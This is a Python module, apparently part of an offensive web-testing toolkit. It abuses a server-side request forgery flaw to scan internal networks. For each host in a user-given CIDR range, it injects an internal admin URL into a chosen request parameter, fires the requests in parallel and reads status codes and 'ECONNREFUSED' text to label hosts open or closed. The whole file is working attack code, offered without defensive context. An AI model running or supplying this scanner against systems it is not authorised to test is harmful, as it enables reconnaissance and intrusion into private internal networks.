import ipaddress
import requests

from Module.threading_utils import threads

def scanNet(request_info, params, network, port, url):
    try:
        method, _ , header, body, is_json = request_info
        if method == "POST" or method == "PUT":
            body_data = body.copy()
            if params in body_data:
                body_data[params] = f"http://{network}:{port}/admin"
            if is_json:
                response = requests.request(method, url, headers=header, json=body_data, timeout=3)
            else:
                body_str = "&".join([f"{k}={v}" for k, v in body_data.items()])
                response = requests.request(method, url, headers=header, data=body_str, timeout=3)
        elif method == "GET":
            response = requests.request(
                method,
                url,
                headers=header,
                params={params: f"http://{network}:{port}/admin"},
                timeout=3,
            )
        print(f"[{network}] Status: {response.status_code}")
        if response.status_code == 200:
            print(f"Network {network} is open.")
        else:
            body_res = response.text
            if "ECONNREFUSED" in body_res:
                print(f"Network {network} is open but connection refused.")
            else:
                print(f"Network {network} is closed/filtered.")
    except requests.exceptions.RequestException as exc:
        print(f"Network {network} error: {exc}")

def run(request_info, params,  url):
    target_subnet = input("Target IP/CIDR (e.g., 192.168.0.1/20): ").strip()
    port = int(input("Port (default 80): ").strip() or "80")
    network = ipaddress.ip_network(target_subnet, strict=False)
    networks = list(network.hosts())
    def worker(network):
        network_sc = str(network)
        scanNet(request_info, params, network_sc, port, url)
    threads(networks, worker)